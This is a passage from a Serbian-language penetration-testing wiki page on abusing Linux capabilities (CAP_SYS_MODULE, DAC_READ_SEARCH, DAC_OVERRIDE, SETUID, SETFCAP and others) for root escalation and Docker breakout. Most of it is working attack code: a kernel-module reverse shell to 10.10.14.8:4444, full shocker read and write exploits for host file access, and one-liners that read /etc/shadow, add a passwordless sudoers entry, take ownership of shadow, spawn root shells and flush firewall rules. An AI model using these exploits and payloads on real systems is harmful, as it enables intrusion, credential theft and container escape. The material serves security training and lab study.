#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> Prazan znak pre svake make naredbe u Makefile-u **mora biti tabulator, a ne razmaci**!

Izvršite `make` da biste ga kompajlirali.
```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Konačno, pokrenite `nc` unutar shell-a i **učitajte modul** iz drugog shell-a, pa ćete uhvatiti shell u nc procesu:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**Kod ove tehnike je kopiran iz laboratorije „Abusing SYS_MODULE Capability“ sa** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)<sup>[[1]](#references)</sup>

Još jedan primer ove tehnike može se pronaći na adresi [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) omogućava procesu da **zaobiđe dozvole za čitanje fajlova, kao i za čitanje i izvršavanje direktorijuma**. Njegova primarna namena je pretraga ili čitanje fajlova. Međutim, takođe omogućava procesu da koristi funkciju `open_by_handle_at(2)`, koja može pristupiti bilo kom fajlu, uključujući one izvan mount namespace-a procesa. Handle koji se koristi u funkciji `open_by_handle_at(2)` trebalo bi da bude netransparentni identifikator dobijen pomoću funkcije `name_to_handle_at(2)`, ali može sadržati osetljive informacije, kao što su inode brojevi, koji su podložni izmeni. Potencijal za exploitation ove capability, posebno u kontekstu Docker containers, demonstrirao je Sebastian Krahmer pomoću shocker exploit-a, što je analizirano [ovde](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).<sup>[[12]](#references)[[13]](#references)</sup>
**To znači da možete** **zaobići provere dozvola za čitanje fajlova i provere dozvola za čitanje/izvršavanje direktorijuma.**

**Primer sa binary-em**

Binary će moći da pročita bilo koji fajl. Dakle, ako fajl kao što je tar ima ovu capability, moći će da pročita shadow fajl:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Primer sa binary2**

U ovom slučaju pretpostavimo da **`python`** binary ima ovu capability. Da biste izlistali datoteke korisnika root, možete izvršiti:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
A da biste pročitali datoteku, mogli biste da uradite:
```python
print(open("/etc/shadow", "r").read())
```
**Example in Environment (Docker breakout)**

Omogućene capabilities unutar Docker kontejnera možete proveriti pomoću:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
U prethodnom izlazu možete videti da je capability **DAC_READ_SEARCH** omogućena. Kao rezultat toga, container može da **debug processes**.

Kako funkcioniše sledeći exploit možete saznati na [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), ali ukratko, **CAP_DAC_READ_SEARCH** nam ne omogućava samo prolazak kroz file system bez provera dozvola, već i eksplicitno uklanja sve provere za _**open_by_handle_at(2)**_ i **može omogućiti našem procesu pristup osetljivim datotekama koje su otvorili drugi processes**.<sup>[[13]](#references)</sup>

Originalni exploit koji zloupotrebljava ovu dozvolu za čitanje datoteka sa hosta možete pronaći ovde: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), a sledeći kod je **izmenjena verzija koja omogućava da kao prvi argument navedete datoteku koju želite da pročitate i da njen sadržaj sačuvate u datoteci.**<sup>[[12]](#references)</sup>
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> exploit mora da pronađe pokazivač na nešto montirano na hostu. Originalni exploit je koristio fajl /.dockerinit, a ova izmenjena verzija koristi /etc/hostname. Ako exploit ne radi, možda treba da podesite drugi fajl. Da biste pronašli fajl koji je montiran na hostu, samo izvršite komandu mount:

![CAP SYS MODULE - CAP DAC READ SEARCH: exploit mora da pronađe pokazivač na nešto montirano na hostu. Originalni exploit je koristio fajl /.dockerinit, a ova izmenjena verzija koristi...](<../../images/image (407) (1).png>)

**Kod ove tehnike je kopiran iz laboratorije "Abusing DAC_READ_SEARCH Capability" sa** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)<sup>[[1]](#references)</sup>


## CAP_DAC_OVERRIDE

**To znači da možete zaobići provere dozvola za upis nad bilo kojim fajlom, pa možete upisivati u bilo koji fajl.**

Postoji mnogo fajlova koje možete **prepisati radi eskalacije privilegija,** [**you can get ideas from here**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Primer sa binaryjem**

U ovom primeru vim ima ovu capability, pa možete izmeniti bilo koji fajl, kao što su _passwd_, _sudoers_ ili _shadow_:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Primer sa binary 2**

U ovom primeru **`python`** binary će imati ovu capability. Možete koristiti python da prepišete bilo koji fajl:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Primer sa okruženjem + CAP_DAC_READ_SEARCH (Docker breakout)**

Možete proveriti omogućene capabilities unutar Docker containera pomoću:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Pre svega pročitajte prethodni odeljak koji [**abuses DAC_READ_SEARCH capability to read arbitrary files**](linux-capabilities.md#cap_dac_read_search) na hostu i **kompajlirajte** exploit.\
Zatim, **kompajlirajte sledeću verziju shocker exploita** koja će vam omogućiti da **upisujete proizvoljne fajlove** unutar filesystema hosta:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Da biste **pobegli iz** Docker containera, mogli biste da **preuzmete** fajlove `/etc/shadow` i `/etc/passwd` sa hosta, da im **dodate** **novog korisnika** i da upotrebite **`shocker_write`** da biste ih prepisali. Zatim pristupite putem **ssh**.

**Kod ove tehnike je preuzet iz laboratorije "Abusing DAC_OVERRIDE Capability" sa** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)<sup>[[1]](#references)</sup>

## CAP_CHOWN

**To znači da je moguće promeniti vlasništvo nad bilo kojim fajlom.**

**Primer sa binary fajlom**

Pretpostavimo da **`python`** binary ima ovu capability; možete da promenite **vlasnika** fajla **shadow**, **promenite root lozinku** i eskalirate privilegije:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Ili sa **`ruby`** binarnom datotekom koja ima ovu capability:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**Ovo znači da je moguće promeniti dozvole bilo koje datoteke.**

**Primer sa binary**

Ako python ima ovu capability, možete izmeniti dozvole shadow datoteke, **promeniti root lozinku** i eskalirati privilegije:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP_SETUID

**To znači da je moguće postaviti efektivni ID korisnika kreiranog procesa.**

**Primer sa binarnom datotekom**

Ako Python ima ovu **capability**, veoma lako je možete zloupotrebiti za eskalaciju privilegija na root:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Drugi način:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**Ovo znači da je moguće postaviti efektivni ID grupe kreiranog procesa.**

Postoji mnogo datoteka koje možete **prepisati da biste eskalirali privilegije,** [**ideje možete pronaći ovde**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Primer sa binary**

U ovom slučaju treba da potražite zanimljive datoteke koje grupa može da čita, jer možete da se predstavljate kao bilo koja grupa:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Kada pronađete datoteku koju možete zloupotrebiti (čitanjem ili pisanjem) za eskalaciju privilegija, možete **dobiti shell koji se predstavlja kao interesantna grupa** pomoću:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
U ovom slučaju grupa shadow je impersonirana, tako da možete da čitate datoteku `/etc/shadow`:
```bash
cat /etc/shadow
```
### Kombinovani lanac: CAP_SETGID + CAP_CHOWN

Kada su obe capabilities dostupne u istom helper-u, praktičan lanac je:

1. Prebaci EGID na `shadow` (ili drugu privilegovanu grupu).
2. Koristi `chown` nad `/etc/shadow` da postaviš svoj UID uz zadržavanje grupe `shadow`.
3. Pročitaj ciljni hash i izvrši crack/pivot.
```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```
Ovo izbegava potrebu za direktnim full root pristupom i obično je dovoljno za pivot kroz ponovnu upotrebu credentiala.

Ako je **docker** instaliran, možete **impersonate** **docker group** i zloupotrebiti ga za komunikaciju sa [**docker socket** i eskalaciju privilegija](#writable-docker-socket).

## CAP_SETFCAP

**To znači da je moguće postaviti capabilities na fajlove i procese**

**Primer sa binary**

Ako python ima ovu **capability**, veoma lako je možete zloupotrebiti za eskalaciju privilegija na root:
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> Imajte na umu da ćete, ako binarnoj datoteci postavite novu capability pomoću CAP_SETFCAP, izgubiti ovu capability.

Kada imate [SETUID capability](linux-capabilities.md#cap_setuid), možete preći na njen odeljak da biste videli kako da eskalirate privilegije.

**Primer sa okruženjem (Docker breakout)**

Podrazumevano, capability **CAP_SETFCAP se dodeljuje procesu unutar kontejnera u Docker-u**. To možete proveriti tako što ćete uraditi nešto poput:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Ova capability omogućava da se **binarim datotekama dodeli bilo koja druga capability**, pa bismo mogli da razmišljamo o **escaping-u** iz containera **abusing-om bilo kog drugog capability breakout-a** pomenutog na ovoj stranici.\
Međutim, ako pokušate da, na primer, dodelite capability CAP_SYS_ADMIN i CAP_SYS_PTRACE gdb binary-ju, videćete da možete da ih dodelite, ali **binary nakon toga neće moći da se izvrši**:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[Iz dokumentacije](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: Ovo je **ograničavajući nadskup za effective capabilities** koje thread može da preuzme. Takođe je ograničavajući nadskup za capabilities koje thread može da doda u inheri­tabilni skup ako **nema CAP_SETPCAP** capability u svom effective skupu._\
Izgleda da Permitted capabilities ograničavaju one koje mogu da se koriste.\
Međutim, Docker takođe podrazumevano dodeljuje **CAP_SETPCAP**, pa ćete možda moći da **postavite nove capabilities unutar inheritable skupa**.\
Međutim, u dokumentaciji za ovu cap navedeno je: _CAP_SETPCAP : \[…] **dodaje bilo koju capability iz bounding skupa pozivajućeg threada u njegov inheritable skup**._\
Izgleda da u inheritable skup možemo da dodamo samo capabilities iz bounding skupa. To znači da **ne možemo da dodamo nove capabilities, kao što su CAP_SYS_ADMIN ili CAP_SYS_PTRACE, u inherit skup radi eskalacije privilegija**.

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) omogućava brojne osetljive operacije, uključujući pristup uređajima `/dev/mem`, `/dev/kmem` ili `/proc/kcore`, izmenu vrednosti `mmap_min_addr`, pristup sistemskim pozivima `ioperm(2)` i `iopl(2)`, kao i različite disk komande. `FIBMAP ioctl(2)` je takođe omogućen pomoću ove capability, što je u [prošlosti](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) izazivalo probleme. Prema man stranici, ovo takođe omogućava vlasniku da opisno `perform a range of device-specific operations on other devices`.

Ovo može biti korisno za **privilege escalation** i **Docker breakout.**

## CAP_KILL

**To znači da je moguće ubiti bilo koji proces.**

**Primer sa binaryjem**

Pretpostavimo da **`python`** binary ima ovu capability. Ako biste mogli da **izmenite i neku konfiguraciju servisa ili socketa** (ili bilo koji konfiguracioni fajl povezan sa servisom), mogli biste da ga backdoorujete, a zatim ubijete proces povezan sa tim servisom i sačekate da se nova konfiguraciona datoteka izvrši sa vašim backdoorom.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc with kill**

Ako imate `kill` capabilities i postoji **node program koji se izvršava kao root** (ili kao drugi korisnik), verovatno biste mogli da mu **pošaljete** signal **SIGUSR1** i naterate ga da **otvori node debugger**, na koji se možete povezati.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**Ovo znači da je moguće slušati na bilo kom portu (čak i na privilegovanim portovima).** Ovom capability nije moguće direktno eskalirati privilegije.

**Primer sa binary**

Ako **`python`** ima ovu capability, moći će da sluša na bilo kom portu i da se čak poveže sa njega na bilo koji drugi port (neki services zahtevaju connections sa specifičnih privilegovanih portova)

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) capability omogućava procesima da **kreiraju RAW i PACKET sockets**, čime mogu da generišu i šalju proizvoljne mrežne pakete. Ovo može dovesti do bezbednosnih rizika u kontejnerizovanim okruženjima, kao što su spoofing paketa, ubacivanje saobraćaja i zaobilaženje kontrola mrežnog pristupa. Maliciozni akteri bi ovo mogli da iskoriste za ometanje rutiranja kontejnera ili ugrožavanje bezbednosti mreže hosta, naročito bez odgovarajuće firewall zaštite. Pored toga, **CAP_NET_RAW** je ključan za privilegovane kontejnere kako bi podržali operacije poput ping-a putem RAW ICMP zahteva.

**To znači da je moguće sniff-ovati saobraćaj.** Ovom capability opcijom nije moguće direktno eskalirati privilegije.

**Primer sa binarnim fajlom**

Ako binary **`tcpdump`** ima ovu capability opciju, moći ćete da ga koristite za prikupljanje informacija o mreži.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Napominjemo da, ako vam **environment** omogućava ovu capability, možete koristiti i **`tcpdump`** za presretanje saobraćaja.

**Example with binary 2**

Sledeći primer je kod u jeziku **`python2`** koji može biti koristan za presretanje saobraćaja na interfejsu "**lo**" (**localhost**). Kod potiče iz lab-a "_The Basics: CAP-NET_BIND + NET_RAW_" sa adrese [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)<sup>[[1]](#references)</sup>.
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) capability daje vlasniku mogućnost da **menja mrežne konfiguracije**, uključujući podešavanja firewall-a, routing tabele, dozvole socket-a i podešavanja mrežnih interfejsa unutar izloženih network namespaces. Takođe omogućava uključivanje **promiscuous mode** režima na mrežnim interfejsima, što dozvoljava sniffing paketa kroz namespaces.

**Primer sa binary-jem**

Pretpostavimo da **python binary** ima ove capabilities.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**To znači da je moguće menjati atribute inode-a.** Ne možete direktno eskalirati privilegije pomoću ove capability.

**Primer sa binary**

Ako pronađete da je fajl immutable i da python ima ovu capability, možete **ukloniti immutable atribut i učiniti fajl izmenjivim:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
> [!TIP]
> Imajte na umu da se ovaj immutable atribut obično postavlja i uklanja pomoću:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) omogućava izvršavanje `chroot(2)` system call-a, što potencijalno može omogućiti escape iz `chroot(2)` okruženja pomoću poznatih ranjivosti:<sup>[[11]](#references)</sup>

- [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)<sup>[[11]](#references)</sup>
- [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) ne omogućava samo izvršavanje `reboot(2)` system call-a za restartovanje sistema, uključujući specifične komande poput `LINUX_REBOOT_CMD_RESTART2`, prilagođene određenim hardware platformama, već omogućava i korišćenje `kexec_load(2)` i, od Linux 3.17, `kexec_file_load(2)` za učitavanje novih, odnosno potpisanih crash kernel-a.

## CAP_SYSLOG

